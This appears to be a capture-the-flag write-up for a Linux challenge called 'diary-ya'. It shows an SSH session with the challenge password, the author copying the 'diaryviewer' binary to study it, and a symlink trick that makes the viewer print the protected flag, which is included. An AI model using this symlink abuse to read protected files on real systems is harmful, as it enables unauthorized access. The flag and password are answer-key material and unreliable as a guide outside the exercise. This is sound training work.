diary-ya
150
Nobody steals from creed bratton and gets away with it. The last person to do this disappeared. His name? Creed bratton.

ssh ctf@ctf.dart.com.sg -p 2301

Password: zwdmpipkf

```sh
┌──(razali㉿razali)-[~]
└─$ ssh ctf@192.168.40.199 -p 2301
The authenticity of host '[192.168.40.199]:2301 ([192.168.40.199]:2301)' can't be established.
ECDSA key fingerprint is SHA256:mzSGxnkaYOd3DJsJcnTrK6iuqzawg5Z1hjgcbkY5V2M.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.40.199]:2301' (ECDSA) to the list of known hosts.
ctf@192.168.40.199's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 5.4.0-51-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

ctf@diary-ya:~$ pwd
/home/ctf
ctf@diary-ya:~$ ls
ctf@diary-ya:~$ cd ..
ctf@diary-ya:/home$ ls
creed  ctf
ctf@diary-ya:/home$ ll
total 20
drwxr-xr-x 1 root  root  4096 Jun 29 05:20 ./
drwxr-xr-x 1 root  root  4096 Jul 11 13:47 ../
drwxr-xr-x 1 creed creed 4096 Jun 29 05:20 creed/
drwxr-xr-x 1 ctf   ctf   4096 Jul 11 13:48 ctf/
ctf@diary-ya:/home$ cd creed/
ctf@diary-ya:/home/creed$ ll
total 32
drwxr-xr-x 1 creed creed 4096 Jun 29 05:20 ./
drwxr-xr-x 1 root  root  4096 Jun 29 05:20 ../
-rw-r--r-- 1 creed creed  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 creed creed 3771 Apr  4  2018 .bashrc
-rw-r--r-- 1 creed creed  807 Apr  4  2018 .profile
drwxrwxrwx 1 creed creed 4096 Jun 29 05:20 diary_entries/
-rwxrwx--- 1 creed creed   47 Jun  1 14:14 flag.txt*
ctf@diary-ya:/home/creed$ cd diary_entries/
ctf@diary-ya:/home/creed/diary_entries$ ll
total 44
drwxrwxrwx 1 creed creed 4096 Jun 29 05:20 ./
drwxr-xr-x 1 creed creed 4096 Jun 29 05:20 ../
-rwxrwx--- 1 creed creed 2321 Jun  1 14:14 07082008.txt*
-rwxrwx--- 1 creed creed 1825 Jun  1 14:14 09032015.txt*
-rwxrwx--- 1 creed creed 1622 Jun  1 14:14 12062010.txt*
-rwxrwx--- 1 creed creed 2598 Jun  1 14:14 13012021.txt*
-rwxrwx--- 1 creed creed 2289 Jun  1 14:14 17042017.txt*
-rwxrwx--- 1 creed creed 1307 Jun  1 14:14 20042004.txt*
-rwxrwx--- 1 creed creed 2070 Jun  1 14:14 22052019.txt*
-rwxrwx--- 1 creed creed 2445 Jun  1 14:14 28082020.txt*
-rwxrwxr-- 1 creed creed   17 Jun  1 14:14 confidential_entries.txt*
ctf@diary-ya:/home/creed/diary_entries$ diaryviewer ../flag.txt 
Fool me once, strike one. But fool me twice... strike three.
ctf@diary-ya:/home/creed/diary_entries$ diaryviewer ../flag'
> ^C
ctf@diary-ya:/home/creed/diary_entries$ diaryviewer ../flag
Fool me once, strike one. But fool me twice... strike three.

```
```sh
D:\My Documents\Writeups\Reversing\CTF\Ivy Finals\Linux\diary-ya 3>scp -P 2301 ctf@192.168.40.199:/usr/bin/diaryviewer .
ctf@192.168.40.199's password:
diaryviewer                                                                           100%   17KB   1.5MB/s   00:00

D:\My Documents\Writeups\Reversing\CTF\Ivy Finals\Linux\diary-ya 3>
```

```sh
ctf@diary-ya:/home/creed/diary_entries$ ln -s ../flag.txt flag.txt
ctf@diary-ya:/home/creed/diary_entries$ diaryviewer flag
Not confidential, proceeding to display
Requested diary entry:
==========
ivyctf{deer_dairy_is_a_delicacy_in_new_zealand}
```

